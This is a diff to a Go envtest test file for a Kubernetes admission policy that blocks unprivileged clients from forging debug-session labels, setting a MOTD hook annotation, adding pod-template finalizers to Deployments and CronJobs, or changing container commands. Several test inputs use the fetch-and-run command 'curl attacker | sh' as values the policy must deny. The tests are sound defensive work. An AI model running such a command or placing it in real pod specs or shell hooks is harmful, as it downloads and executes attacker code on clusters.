@@ -99,6 +99,8 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 		denied(t, forger.Create(ctx, pod("forged-label", sessionLabel, nil)))
 		denied(t, forger.Create(ctx, pod("forged-uid", nil, map[string]string{DebugSessionUIDAnnotationKey: "uid"})))
 		denied(t, forger.Create(ctx, pod("forged-ephemeral", nil, map[string]string{"breakglass.telekom.com/ephemeral.debugger": "x"})))
+		denied(t, forger.Create(ctx, pod("forged-motd", nil, map[string]string{motdProfileAnnotation: "curl attacker | sh"})),
+			"interactive shells source the MOTD hook annotation")
 		assert.NoError(t, forger.Create(ctx, pod("plain", map[string]string{"app": "x", "breakglass.telekom.com/debug-template": "t"}, nil)),
 			"unreserved keys stay usable")
 	})
@@ -121,6 +123,8 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Labels, DebugSessionLabelKey) }))
 		denied(t, mutate("debug", func(p *corev1.Pod) { delete(p.Annotations, DebugSessionUIDAnnotationKey) }))
 		assert.NoError(t, mutate("debug", func(p *corev1.Pod) { p.Annotations["team"] = "a" }), "annotations of a debug pod stay editable")
+		denied(t, mutate("debug", func(p *corev1.Pod) { p.Annotations[motdProfileAnnotation] = "curl attacker | sh" }),
+			"except the MOTD hook that its shells source")
 		denied(t, mutate("debug", func(p *corev1.Pod) { p.Labels["team"] = "a" }), "labels select a debug pod into its workload")
 
 		p := &corev1.Pod{}
@@ -261,6 +265,13 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Annotations = map[string]string{"team": "a"} }))
 		denied(t, edit(func(d *appsv1.Deployment) { d.Labels = map[string]string{"team": "a"} }))
 		denied(t, edit(func(d *appsv1.Deployment) { d.Spec.Template.Spec.Containers[0].Image = "attacker/image" }))
+		denied(t, edit(func(d *appsv1.Deployment) { d.Spec.Template.Finalizers = []string{"example.com/hold"} }),
+			"the controller copies template finalizers onto the Pods")
+		debugCronJob := &batchv1.CronJob{ObjectMeta: meta("debug-cron"), Spec: batchv1.CronJobSpec{Schedule: "@daily", Suspend: ptr.To(true),
+			JobTemplate: batchv1.JobTemplateSpec{Spec: batchv1.JobSpec{Template: template(selected)}}}}
+		require.NoError(t, controller.Create(ctx, debugCronJob))
+		debugCronJob.Spec.JobTemplate.Spec.Template.Finalizers = []string{"example.com/hold"}
+		denied(t, forger.Update(ctx, debugCronJob), "the CronJob's pod template finalizers too")
 		denied(t, edit(func(d *appsv1.Deployment) {
 			d.Spec.Template.Spec.Containers[0].Command = []string{"sh", "-c", "curl attacker | sh"}
 		}))
